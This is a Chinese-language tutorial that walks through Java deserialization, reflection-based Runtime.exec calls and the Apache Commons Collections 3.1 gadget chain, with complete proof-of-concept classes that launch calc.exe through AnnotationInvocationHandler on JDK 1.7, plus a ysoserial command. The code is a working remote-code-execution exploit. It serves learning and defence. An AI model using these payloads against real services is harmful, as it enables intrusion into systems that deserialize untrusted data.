**java反序列化**

**1.反序列化依靠的类和方法**

ObjectOutputStream类的writeObject(Object obj) 将数据序列化成序列化的字符串

ObjectInputStream类的readObject(Object obj) 将序列化的字符串反序列化成数据

**2.小测试**

```
package Serialize1;

import java.io.*;

public class Serialize {
    public static void main(String[] args) throws Exception{
        //要序列化的数据
        String name = "sijidou";
 
 		//序列化
 		FileOutputStream fileOutputStream = new FileOutputStream("serialize1.txt");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(name);
        objectOutputStream.close();
		
		//反序列化
        FileInputStream fileInputStream = new FileInputStream("serialize1.txt");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        Object result = objectInputStream.readObject();
        objectInputStream.close();
        System.out.println(result);
    }
}
```

中间会生成一个serialize1.txt的文件，文件内容为序列化的内容



**3.先聊聊命令执行和反射**

java里面能够执行系统命令的类是Runtime类的exec()方法，至于getRuntime()其实就相当于new一个Runtime方法，下面代码可以弹出记事本

```
package Serialize1;

public class ExecTest {
    public static void main(String[] args) throws Exception{
        Runtime.getRuntime().exec("notepad.exe");
    }
}
```

使用反射机制来实现Runtime的exec方法调用

```
package Serialize1;

import java.lang.reflect.Method;

public class ExecTest {
    public static void main(String[] args) throws Exception{
        Object runtime = Class.forName("java.lang.Runtime").getMethod("getRuntime", new Class[]{}).invoke(null);
        //System.out.println(runtime.getClass().getName());
 	Class.forName("java.lang.Runtime").getMethod("exec",String.class).invoke(runtime,"notepad.exe");
    }
}
```

这里第一句Object runtime =Class.forName("java.lang.Runtime")的作用

等价于 Object runtime = Runtime.getRuntime() 

又等价于 Object runtime = new Runtime()

目的是获取一个对象实例好被下一个invoke调用



第二句Class.forName("java.lang.Runtime").xxxx的作用就是调用上一步生成的runtime实例的exec方法，并将"notepad.exe"参数传入exec()方法

```
getMethod(方法名, 方法类型)
invoke(某个对象实例， 传入参数)
```



**4.利用序列化执行恶意代码**

结合上面反射和序列化，将弹出记事本运用到反序列化中

```
package Serialize1;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class Serialize2 {
    public static void main(String[] args) throws Exception{
        //要序列化的数据
        Object runtime = Class.forName("java.lang.Runtime").getMethod("getRuntime", new Class[]{}).invoke(null);
        Object evil = Class.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(runtime, "notepad.exe");
        //不用反射，直接调用也是可以触发的
		//Object evil = Runtime.getRuntime().exec("notepad.exe");

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("serialize2.txt");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(evil);
        objectOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("serialize2.txt");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        Object result = objectInputStream.readObject();
        objectInputStream.close();
        System.out.println(result);
    }
}
```

把evil变量存入能运行记事本的执行代码，并将内容反序列化到文件中，再打开该文件会触发打开记事本



**apache的反序列化漏洞**

payload中的利用反射的结构是这样的

```
Transformer[] transformers = new Transformer[] {
	new ConstantTransformer(Runtime.class),
	
	new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
	
	new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
	
	new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };
```

理解了好久，这里简述下我的理解,InvokerTransformer的构造函数如下

```
   public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    }
```

第一个是字符串，是调用的方法名，第二个是个Class数组，带的是方法的参数的类型，第三个是Object数组，带的是方法的参数的值

以getMethod举例

第一个参数"getMethod"是这个函数的名字

第二个参数new Class[]{String.class, Class[].class}是getMethod的2个参数参数类型，一个是String，一个是class[]

第三个参数new Object[]{"getRuntime", new Class[0]}是getMethod的2个参数值，一个是getRuntime，一个是空，因为是数组形式所以要这么写

上面这个组合起来相当于 getMethod(\<String\> "getRuntime", \<Class[]\> null)



看下完整的payload代码

```
public class ApacheSerialize {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };
        
        //将transformers数组存入ChaniedTransformer这个继承类
        Transformer transformerChain = new ChainedTransformer(transformers);

		//创建Map并绑定transformerChina
        Map innerMap = new HashMap();
        innerMap.put("value", "value");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

		//触发漏洞
        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
        onlyElement.setValue("foobar");
    }
}
```



整体说一下这个反序列化实现的过程

在`InvokerTransformer`下存在以下的处理过程

```
public Object transform(Object input) {
    if (input == null) {
        return null;
    } else {
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
            return method.invoke(input, this.iArgs);
        } catch (NoSuchMethodException var4) {
            throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException var5) {
            throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException var6) {
            throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var6);
        }
    }
}
```

可以看到它利用了反射进行调用函数，Object是传进来的参数，`this.iMethodName`,`this.iParamTypes`和`this.iArgs`是类中的私有成员

这反射类比下正常的调用就是如下形式 

```
input.(this.iMethodName(<this.iParamTypes[0]> this.iArgs[0], <this.iParamTypes[1]> this.iArgs[1]))
```

`input`是类名， `this.iMethodName`是方法名， 之后的`this.iParamTypes`是参数类型，`this.iParamTypes`是参数的值

查看3个私有变量传进来的方式，是利用的构造函数，即在new的时候，把参数代入到私有成员

```
public class InvokerTransformer implements Transformer, Serializable {
	private final String iMethodName;
	private final Class[] iParamTypes;
	private final Object[] iArgs;

    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    }
```

因此我在payload中第一部生成的transformers数组的效果等价于

```
transformers[1]
input.getMethod("getRuntime", null)

transformers[2]
input.invoke(null, null);

transformers[3]
input.exec("calc.exe");
```

input是后面调用`transform(Object input)`的传参，但是这3个明显是闲散的，我们的目的是把它们组合起来

回到payload中`transformers`数组的第一个值是

```
new ConstantTransformer(Runtime.class)
```

为什么它的画风和其他的值不一样，这个我理解的是它会告诉之后的操作是从哪个类里面进行查找的

下面的`ChainedTransformer`是将数组存储为一个对象

```
Transformer transformerChain = new ChainedTransformer(transformers);
```

上面的对象将当做参数绑定到`TransformedMap`中，当然一同绑定的还有一个普通的hashmap对象

```
Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
```

这里说明下为什么要申请个`TransformedMap`对象

我们为了把`transform`里面的内容组合起来，`TransformedMap`中有个如下函数

```
protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
	super(map);
    this.keyTransformer = keyTransformer;
    this.valueTransformer = valueTransformer;
}

protected Object checkSetValue(Object value) {
	return this.valueTransformer.transform(value);
}
```

申请对象的时候 上面传进来的`TransformerChian`会存储在`this.valueTransformer`中，然后`checkSetValue(Object value)`会调用`this.valueTransformer`的transform方法,并且参数是从checkSetValue中传参数入的

看一下`ChainedTransformer`类的transform方法

```
    public Object transform(Object object) {
        for(int i = 0; i < this.iTransformers.length; ++i) {
            object = this.iTransformers[i].transform(object);
        }

        return object;
    }
```

是一个反复的循环调用，后面一个transformers调用前面一个tranformers的返回值，并且会遍历一遍数组里面的所有值

再看看之前构造的chainedTransformer对象里面的内容

```
[0]是ConstantTransformer对象，它会返回new时候的参数中的Object对象，这里也是就是"java.Runtime"
[1]-[3]是InvokerTransformer对象，调用的是反射的代码
```

然后调用这个`TransformedMap`对象的利用 Map.Entry取得第一个值，调用修改值的函数，会触发下面的setValue()代码

```
  public Object setValue(Object value) {
            value = this.parent.checkSetValue(value);
            return this.entry.setValue(value);
        }
```

而其中的checkSetValue()实际上是触发TransoformedMap的checkSetValue()方法，而此次的this.valueTransformer就是ChianedTransformer类，之后就会触发漏洞利用链

```
protected Object checkSetValue(Object value) {
    return this.valueTransformer.transform(value);
}
```

整理一下思路

```
ChianedTransformer可以理解为一个数组容器
ChianedTransformer里面装了4个transform
TransoformedMap绑定了ChiandTransformer

step1 : 利用TransoformedMap的setValue触发ChianedTransformer的transform

step2 : ChianedTransformer的transform是一个循环调用该类里面的transformer的transform方法

step3 : 第一次循环调用ConstantTransformer("java.Runtime")对象的transformer调用参数为"foobar"(正常要修改的值)，结果无影响

step4 : 第二次循环调用InvokerTransformer对象getMethod("getRuntime",null)方法，参数为("java.Runtime")会返回一个Runtime.getRuntime()方法
相当于生产一个字符串，但还没有执行，"Rumtime.getRuntime();"

step5 : 第三次循环调用InvokerTransformer对象Invoke(null,null)方法，参数为Runtime.getRuntime()，那么会返回一个Runtime对象实例
相当于执行了该字符串，Object runtime = Rumtime.getRuntime();

step6 : 第四次循环调用InvokerTransformer对象exec("clac.exe")方法,参数为一个Runtime的对象实例，会执行弹出计算器操作
调用了对象的方法，runtime.exec("clac,exe")

```

至此已经能够触发漏洞了，之后还会执行什么步骤无关紧要了



**反序列化漏洞实现**

上面的代码只是作为一段小脚本执行了，但是没有被用来通过网络传输payload，然后被反序列化利用，并且还要满足被反序列化之后还会改变map的值等总总因素的影响,假设一个理想的情况如下

```
public class ApacheSerialize2 implements Serializable {
    public static void main(String[] args) throws Exception{
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                 new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                 new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
         };
         Transformer transformerChain = new ChainedTransformer(transformers);

         Map map = new HashMap();
         map.put("value", "sijidou");
         Map transformedMap = TransformedMap.decorate(map, null, transformerChain);

         //序列化
         FileOutputStream fileOutputStream = new FileOutputStream("serialize2.txt");
         ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
         objectOutputStream.writeObject(transformedMap);
         objectOutputStream.close();

         //反序列化
         FileInputStream fileInputStream = new FileInputStream("serialize2.txt");
         ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
         Map result = (TransformedMap)objectInputStream.readObject();
         objectInputStream.close();
         System.out.println(result);

         Map.Entry onlyElement = (Map.Entry) result.entrySet().iterator().next();
         onlyElement.setValue("foobar");
```

该情况可以触发，但是现实中往往不一定存在把数据反序列化后，再调用其中TransformedMap的Map.Entry类型的setValue方法

在java中，自带的类中还有一个类叫做`AnnotationInvocationHandler`

该类中重写的readObject方法在被调用时会将其中的map，转成Map.Entry，并执行setValue操作，那么能把`TransformedMap`装入这个`AnnotationInvocationHandler`类，再传过去，就可以不用考虑之后代码是否执行`setValue`就可以直接利用漏洞了

```
 private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        var1.defaultReadObject();
        AnnotationType var2 = null;

        try {
            var2 = AnnotationType.getInstance(this.type);
        } catch (IllegalArgumentException var9) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map var3 = var2.memberTypes();
        Iterator var4 = this.memberValues.entrySet().iterator();

        while(var4.hasNext()) {
            Entry var5 = (Entry)var4.next();
            String var6 = (String)var5.getKey();
            Class var7 = (Class)var3.get(var6);
            if (var7 != null) {
                Object var8 = var5.getValue();
                if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
                }
            }
        }

    }
}
```

setValue的点在这一行

```
var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
```

最后利用的payload如下

```
package Serialize2;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class ApacheSerialize2 implements Serializable {
    public static void main(String[] args) throws Exception{
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                 new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                 new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
         };
         Transformer transformerChain = new ChainedTransformer(transformers);

         Map map = new HashMap();
         map.put("value", "sijidou");
         Map transformedMap = TransformedMap.decorate(map, null, transformerChain);

         Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
         Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
         ctor.setAccessible(true);
         Object instance = ctor.newInstance(Target.class, transformedMap);

         //序列化
         FileOutputStream fileOutputStream = new FileOutputStream("serialize3.txt");
         ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
         objectOutputStream.writeObject(instance);
         objectOutputStream.close();

         //反序列化
         FileInputStream fileInputStream = new FileInputStream("serialize3.txt");
         ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
         Object result = objectInputStream.readObject();
         objectInputStream.close();
         System.out.println(result);

    }
}
```

为什么jdk为1.8就无法这么利用了,看jdk1.8的`AnnotationInvocationHandler`源码，readObject中在jdk1.7的`setValue`已经变成了

```
var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + "[" + var11 + "]")).setMember((Method)var5.members().get(var10));
```



```
 private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        GetField var2 = var1.readFields();
        Class var3 = (Class)var2.get("type", (Object)null);
        Map var4 = (Map)var2.get("memberValues", (Object)null);
        AnnotationType var5 = null;

        try {
            var5 = AnnotationType.getInstance(var3);
        } catch (IllegalArgumentException var13) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map var6 = var5.memberTypes();
        LinkedHashMap var7 = new LinkedHashMap();

        String var10;
        Object var11;
        for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) {
            Entry var9 = (Entry)var8.next();
            var10 = (String)var9.getKey();
            var11 = null;
            Class var12 = (Class)var6.get(var10);
            if (var12 != null) {
                var11 = var9.getValue();
                if (!var12.isInstance(var11) && !(var11 instanceof ExceptionProxy)) {
                    var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + "[" + var11 + "]")).setMember((Method)var5.members().get(var10));
                }
            }
        }

        AnnotationInvocationHandler.UnsafeAccessor.setType(this, var3);
        AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(this, var7);
    }
```

ysoserial的包里面也有commons-collectons-3.1的payload，它利用的是jdk中的BadAttributeValueExpException这个类重写readObject来实现的

ysoserial的使用方法

```
java -jar ysoserial.jar CommonsCollections1 calc.exe > 1.txt
```

把1.txt 里面的内容反序列化化即可触发生成calc.exe的命令





https://www.cnblogs.com/ysocean/p/6516248.html

https://www.freebuf.com/vuls/170344.html

https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/

https://www.cnblogs.com/luoxn28/p/5686794.html
